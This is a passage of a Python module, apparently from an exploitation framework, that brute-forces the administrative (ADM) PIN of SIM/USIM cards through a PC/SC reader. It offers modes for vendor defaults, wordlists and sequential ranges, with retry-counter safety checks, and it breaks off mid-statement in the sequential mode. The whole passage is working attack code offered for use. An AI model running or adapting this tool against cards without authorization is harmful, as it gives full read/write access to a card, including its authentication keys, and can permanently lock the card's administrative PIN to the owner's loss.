class Exploit(Exploit):
    """SIM ADM PIN brute-force - recover administrative PIN via systematic testing."""

    __info__ = {
        "name": "SIM ADM Brute Force",
        "description": (
            "Attempt to recover the ADM (Administrative) PIN of a SIM card "
            "through sequential brute-force, wordlist attack, or common "
            "vendor default testing. The ADM PIN grants full card access. "
            "SAFETY: always checks retry counter before attempts; refuses "
            "if 0 remain. Requires PC/SC reader and pyscard."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "3GPP TS 11.11 Section 9.2.7 (VERIFY CHV)",
            "3GPP TS 31.102 (USIM, PIN/ADM management)",
            "ETSI TS 102.221 Section 11.1.9 (VERIFY PIN)",
            "https://osmocom.org/projects/pysim/wiki",
        ),
        "devices": ("SIM", "USIM", "UICC"),
    }

    mode = OptString(
        "info",
        "Modo: info | check_remaining | brute_sequential | brute_wordlist | "
        "brute_common | verify_single",
    )
    reader_index = OptInteger(0, "Indice do leitor PC/SC (padrao: 0)")
    pin_start = OptString("0000000000000000", "PIN inicial em hex (16 chars, brute_sequential)")
    pin_end = OptString("000000000000000F", "PIN final em hex (16 chars, brute_sequential)")
    wordlist = OptString("", "Caminho do arquivo wordlist (um PIN hex por linha)")
    delay_ms = OptInteger(100, "Delay entre tentativas em milissegundos")
    output_dir = OptString(".tmp", "Diretorio de saida para logs")
    dry_run = OptBool(False, "Exibir operacoes sem executar")
    i_know_scope = OptBool(False, "Confirm authorized lab environment and SIM ownership")

    _VALID_MODES = frozenset({
        "info", "check_remaining", "brute_sequential",
        "brute_wordlist", "brute_common", "verify_single",
    })

    # ------------------------------------------------------------------
    # Infrastructure
    # ------------------------------------------------------------------

    def _ensure_output_dir(self) -> str | None:
        out = str(self.output_dir).strip() or ".tmp"
        try:
            os.makedirs(out, exist_ok=True)
            return out
        except OSError as exc:
            print_error(f"Falha ao criar diretorio de saida: {exc}")
            return None

    def _get_connection(self) -> Any | None:
        if not HAS_PYSCARD:
            print_error("pyscard nao instalado. pip install pyscard")
            return None
        try:
            available = list_readers()
        except Exception as exc:
            print_error(f"Falha ao listar leitores PC/SC: {exc}")
            return None

        if not available:
            print_error("Nenhum leitor PC/SC detectado.")
            return None

        idx = int(self.reader_index)
        if idx < 0 or idx >= len(available):
            print_error(
                f"Indice {idx} invalido. Leitores: {len(available)}"
            )
            for i, r in enumerate(available):
                print_info(f"  [{i}] {r}")
            return None

        reader = available[idx]
        print_status(f"Conectando ao leitor: {reader}")
        try:
            conn = reader.createConnection()
            conn.connect()
            return conn
        except Exception as exc:
            print_error(f"Falha na conexao: {exc}")
            return None

    def _send_apdu(self, conn: Any, apdu: list[int]) -> tuple[list[int], int, int]:
        data, sw1, sw2 = conn.transmit(apdu)
        return data, sw1, sw2

    def _check_retry_counter(self, conn: Any) -> int:
        """Read ADM1 retry counter. Returns remaining attempts, or -1 on error."""
        apdu = [VERIFY_CLA, VERIFY_INS, VERIFY_P1, VERIFY_P2_ADM1, 0x00]
        try:
            _, sw1, sw2 = self._send_apdu(conn, apdu)
        except Exception as exc:
            print_error(f"Falha ao verificar contador de tentativas: {exc}")
            return -1

        if sw1 == 0x63 and (sw2 & 0xF0) == 0xC0:
            return sw2 & 0x0F
        if (sw1, sw2) == SW_OK:
            # PIN already verified (unlikely for ADM check, but handle gracefully)
            return 99
        if sw1 == 0x69 and sw2 == 0x83:
            return 0
        if sw1 == 0x69 and sw2 == 0x84:
            return 0

        print_info(
            f"Resposta inesperada ao verificar contador: SW={sw1:02X}{sw2:02X}"
        )
        return -1

    def _verify_adm(self, conn: Any, pin_bytes: list[int]) -> tuple[bool, int, int]:
        """Send VERIFY ADM1 APDU. Returns (success, sw1, sw2)."""
        if len(pin_bytes) != ADM_PIN_LEN:
            return False, 0x6A, 0x80
        apdu = [VERIFY_CLA, VERIFY_INS, VERIFY_P1, VERIFY_P2_ADM1, ADM_PIN_LEN] + pin_bytes
        try:
            _, sw1, sw2 = self._send_apdu(conn, apdu)
        except Exception as exc:
            print_error(f"Erro na transmissao APDU: {exc}")
            return False, 0x6F, 0x00
        return (sw1, sw2) == SW_OK, sw1, sw2

    def _safety_gate(self, conn: Any) -> int | None:
        """Check retry counter and enforce safety limits.

        Returns remaining attempts if safe to proceed, or None if operation
        should be aborted.
        """
        remaining = self._check_retry_counter(conn)
        if remaining < 0:
            print_error("Nao foi possivel ler o contador de tentativas. Abortando.")
            return None
        if remaining == 0:
            print_error(
                "ADM PIN BLOQUEADO: 0 tentativas restantes. "
                "O cartao nao aceita mais verificacoes ADM."
            )
            return None

        print_info(f"Tentativas ADM restantes: {remaining}")
        if remaining < MIN_SAFE_ATTEMPTS:
            print_error(
                f"ATENCAO CRITICA: apenas {remaining} tentativas restantes. "
                "Cada erro reduz o contador. Prosseguir pode bloquear "
                "permanentemente o ADM."
            )
        elif remaining < 5:
            print_status(
                f"AVISO: {remaining} tentativas restantes. Prossiga com cautela."
            )
        return remaining

    def _open_log(self, filename: str) -> Any | None:
        out_dir = self._ensure_output_dir()
        if not out_dir:
            return None
        log_path = os.path.join(out_dir, filename)
        try:
            return open(log_path, "w", encoding="utf-8")
        except OSError as exc:
            print_error(f"Falha ao abrir log: {exc}")
            return None

    # ------------------------------------------------------------------
    # Mode: info
    # ------------------------------------------------------------------

    def _mode_info(self) -> None:
        print_info("SIM ADM PIN Brute Force")
        print_info("=" * 45)
        print_info("")
        print_info("O que e o ADM PIN:")
        print_info("  O PIN ADM (Administrative) concede acesso completo de")
        print_info("  leitura/escrita a todos os arquivos do cartao SIM/USIM.")
        print_info("  Usado por operadoras para provisionamento OTA, atualizacao")
        print_info("  de perfis, escrita de chaves Ki/OPc, e personalizacao.")
        print_info("")
        print_info("Formato:")
        print_info("  8 bytes (16 caracteres hex)")
        print_info("  APDU VERIFY: 00 20 00 0A 08 [8 bytes]")
        print_info("")
        print_info("Risco de bloqueio:")
        print_info("  O contador de tentativas (retry counter) tipicamente permite")
        print_info("  10 tentativas. Cada VERIFY com PIN incorreto decrementa o")
        print_info("  contador. Quando chega a 0, o ADM e bloqueado PERMANENTEMENTE.")
        print_info("  NAO existe PUK para ADM; o bloqueio e irreversivel.")
        print_info("")
        print_info("Mitigacao:")
        print_info("  - Sempre verificar o contador antes de iniciar")
        print_info("  - Usar brute_common primeiro (poucos testes)")
        print_info("  - Interromper se contador < 3")
        print_info("  - Usar SIMs programaveis (sysmoUSIM, GreenSIM) para testes")
        print_info("  - Nunca testar em SIM de operadora em producao")
        print_info("")
        print_info("Defaults conhecidos de fabricantes:")
        for label, pin_bytes in COMMON_ADM_PINS:
            print_info(f"  {_hex(pin_bytes)} : {label}")
        print_info("")
        print_info("Modos:")
        print_info("  check_remaining  - Ler contador de tentativas")
        print_info("  brute_common     - Testar defaults conhecidos")
        print_info("  brute_wordlist   - Testar PINs de um arquivo")
        print_info("  brute_sequential - Forca bruta sequencial (PERIGOSO)")
        print_info("  verify_single    - Testar um unico PIN")
        print_info("")
        print_info("Dependencias:")
        print_info("  pyscard: {}".format("SIM" if HAS_PYSCARD else "NAO - pip install pyscard"))

    # ------------------------------------------------------------------
    # Mode: check_remaining
    # ------------------------------------------------------------------

    def _mode_check_remaining(self, conn: Any) -> None:
        remaining = self._check_retry_counter(conn)
        if remaining < 0:
            print_error("Falha ao ler contador.")
            return
        if remaining == 0:
            print_error("ADM PIN BLOQUEADO: 0 tentativas restantes.")
        elif remaining < MIN_SAFE_ATTEMPTS:
            print_error(
                f"ATENCAO: {remaining} tentativas restantes. Risco alto de bloqueio."
            )
        else:
            print_success(f"Tentativas ADM restantes: {remaining}")

    # ------------------------------------------------------------------
    # Mode: verify_single
    # ------------------------------------------------------------------

    def _mode_verify_single(self, conn: Any) -> None:
        remaining = self._safety_gate(conn)
        if remaining is None:
            return

        pin_hex = str(self.pin_start).strip()
        pin_bytes = _parse_hex_pin(pin_hex)
        if pin_bytes is None:
            print_error(
                "pin_start deve conter exatamente 16 caracteres hex (8 bytes). "
                f"Valor atual: '{pin_hex}'"
            )
            return

        print_status(f"Testando ADM PIN: {_hex(pin_bytes)}")
        success, sw1, sw2 = self._verify_adm(conn, pin_bytes)

        if success:
            print_success(f"ADM PIN CORRETO: {_hex(pin_bytes)}")
        else:
            print_error(
                f"ADM PIN incorreto. SW={sw1:02X}{sw2:02X}"
            )
            new_remaining = self._check_retry_counter(conn)
            if new_remaining >= 0:
                print_info(f"Tentativas restantes: {new_remaining}")

    # ------------------------------------------------------------------
    # Mode: brute_common
    # ------------------------------------------------------------------

    def _mode_brute_common(self, conn: Any) -> None:
        remaining = self._safety_gate(conn)
        if remaining is None:
            return

        if remaining < len(COMMON_ADM_PINS):
            print_error(
                f"Apenas {remaining} tentativas restantes, mas {len(COMMON_ADM_PINS)} PINs comuns para testar. "
                "Risco de bloqueio."
            )
            if remaining < MIN_SAFE_ATTEMPTS:
                print_error(f"Abortando por seguranca (< {MIN_SAFE_ATTEMPTS} tentativas).")
                return

        delay_sec = max(int(self.delay_ms), 0) / 1000.0
        log_fh = self._open_log("adm_brute_common.log")

        print_status(f"Testando {len(COMMON_ADM_PINS)} PINs comuns de fabricantes...")
        tested = 0

        for label, pin_bytes in COMMON_ADM_PINS:
            current_remaining = self._check_retry_counter(conn)
            if current_remaining is not None and current_remaining <= 0:
                print_error("ADM bloqueado durante teste. Abortando.")
                break
            if current_remaining is not None and current_remaining < MIN_SAFE_ATTEMPTS:
                print_error(
                    f"Apenas {current_remaining} tentativas restantes. Abortando por seguranca."
                )
                break

            tested += 1
            pin_str = _hex(pin_bytes)
            print_info(f"[{tested}/{len(COMMON_ADM_PINS)}] Testando: {pin_str} ({label})")

            success, sw1, sw2 = self._verify_adm(conn, pin_bytes)

            if log_fh:
                log_fh.write(
                    "{}: {} ({}) SW={:02X}{:02X}\n".format(
                        "OK" if success else "FAIL", pin_str, label, sw1, sw2,
                    )
                )

            if success:
                print_success(f"ADM PIN ENCONTRADO: {pin_str} ({label})")
                if log_fh:
                    log_fh.write(f"FOUND: {pin_str} ({label})\n")
                    log_fh.close()
                return

            if delay_sec > 0:
                time.sleep(delay_sec)

        if log_fh:
            log_fh.close()

        final = self._check_retry_counter(conn)
        print_info(f"Nenhum PIN comum funcionou. {tested} testados.")
        if final is not None and final >= 0:
            print_info(f"Tentativas restantes: {final}")

    # ------------------------------------------------------------------
    # Mode: brute_wordlist
    # ------------------------------------------------------------------

    def _mode_brute_wordlist(self, conn: Any) -> None:
        remaining = self._safety_gate(conn)
        if remaining is None:
            return

        wl_path = str(self.wordlist).strip()
        if not wl_path:
            print_error("Defina wordlist com o caminho do arquivo de PINs.")
            return

        if not os.path.isfile(wl_path):
            print_error(f"Arquivo nao encontrado: {wl_path}")
            return

        try:
            with open(wl_path, encoding="utf-8") as fh:
                lines = fh.readlines()
        except OSError as exc:
            print_error(f"Falha ao ler wordlist: {exc}")
            return

        pins: list[tuple[str, list[int]]] = []
        for line_num, raw_line in enumerate(lines, 1):
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            pin_bytes = _parse_hex_pin(line)
            if pin_bytes is None:
                print_info(f"Linha {line_num} ignorada (formato invalido): {line}")
                continue
            pins.append((line, pin_bytes))

        if not pins:
            print_error("Nenhum PIN valido encontrado na wordlist.")
            return

        if remaining < len(pins):
            print_error(
                f"Apenas {remaining} tentativas restantes para {len(pins)} PINs na wordlist. "
                "Risco de bloqueio."
            )
            if remaining < MIN_SAFE_ATTEMPTS:
                print_error("Abortando por seguranca.")
                return

        delay_sec = max(int(self.delay_ms), 0) / 1000.0
        log_fh = self._open_log("adm_brute_wordlist.log")

        print_status(f"Testando {len(pins)} PINs da wordlist...")
        tested = 0

        for pin_str, pin_bytes in pins:
            current_remaining = self._check_retry_counter(conn)
            if current_remaining is not None and current_remaining <= 0:
                print_error("ADM bloqueado durante teste. Abortando.")
                break
            if current_remaining is not None and current_remaining < MIN_SAFE_ATTEMPTS:
                print_error(
                    f"Apenas {current_remaining} tentativas restantes. Abortando por seguranca."
                )
                break

            tested += 1
            print_info(f"[{tested}/{len(pins)}] Testando: {_hex(pin_bytes)}")

            success, sw1, sw2 = self._verify_adm(conn, pin_bytes)

            if log_fh:
                log_fh.write(
                    "{}: {} SW={:02X}{:02X}\n".format(
                        "OK" if success else "FAIL", _hex(pin_bytes), sw1, sw2,
                    )
                )

            if success:
                print_success(f"ADM PIN ENCONTRADO: {_hex(pin_bytes)}")
                if log_fh:
                    log_fh.write(f"FOUND: {_hex(pin_bytes)}\n")
                    log_fh.close()
                return

            if delay_sec > 0:
                time.sleep(delay_sec)

        if log_fh:
            log_fh.close()

        final = self._check_retry_counter(conn)
        print_info(f"Nenhum PIN da wordlist funcionou. {tested} testados.")
        if final is not None and final >= 0:
            print_info(f"Tentativas restantes: {final}")

    # ------------------------------------------------------------------
    # Mode: brute_sequential
    # ------------------------------------------------------------------

    def _mode_brute_sequential(self, conn: Any) -> None:
        remaining = self._safety_gate(conn)
        if remaining is None:
            return

        start_hex = str(self.pin_start).strip().replace("0x", "").replace("0X", "")
        end_hex = str(self.pin_end).strip().replace("0x", "").replace("0X", "")

        if len(start_hex) != 16 or len(end_hex) != 16:
            print_error("pin_start e pin_end devem ter exatamente 16 caracteres hex.")
            return

        try:
            start_val = int(start_hex, 16)
            end_val = int(end_hex, 16)
        except ValueError:
            print_error("pin_start ou pin_end contem caracteres hex invalidos.")
            return

        if end_val < start_val:
            print_error("pin_end deve ser >= pin_start.")
            return

        total_range = end_val - start_val + 1
        print_status(
            f"Forca bruta sequencial: {start_hex.upper()} ate {end_hex.upper()} ({total_range} combinacoes)"
        )

        if total_range > remaining:
            print_error(
                f"Range ({total_range}) excede tentativas restantes ({remaining}). "
                "Isso BLOQUEARA o ADM."
            )
            if remaining < MIN_SAFE_ATTEMPTS:
                print_error("Abortando por seguranca.")
                return
            print_error(
                f"Limitando a {max(remaining - MIN_SAFE_ATTEMPTS, 0)} tentativas (maximo seguro com margem)."
            )
            safe_limit = max(remaining - MIN_SAFE_ATTEMPTS, 0)
            if safe_limit == 0:
                print_error("Nenhuma tentativa segura disponivel. Abortando.")
                return
            end_val = min(end_val, start_val + safe_limit - 1)
            total_range = end_val - start_val + 1

        delay_sec = max(int(self.delay_ms), 0) / 1000.0
        log_fh = self._open_log("adm_brute_sequential.log")

        tested = 0
        for value in range(start_val, end_val + 1):
            current_remaining = self._check_retry_counter(conn)
            if current_remaining is not None and current_remaining <= 0:
                print_error("ADM bloqueado durante teste. Abortando.")
                break
            if current_remaining is not None and current_remaining < MIN_SAFE_ATTEMPTS:
                print_error(
                    f"Apenas {current_remaining} tentativas restantes. Abortando por seguranca."
                )
                break

            pin_bytes = _int_to_pin_bytes(value)
            tested += 1
            pin_str = _hex(pin_bytes)

            if tested % 10 == 1 or tested == total_range:
                print_info(f"[{tested}/{total_range}] Testando: {pin_str}")

            success, sw1, sw2 = self._verify_adm(conn, pin_bytes)

            if log_fh:
                log_fh.write(
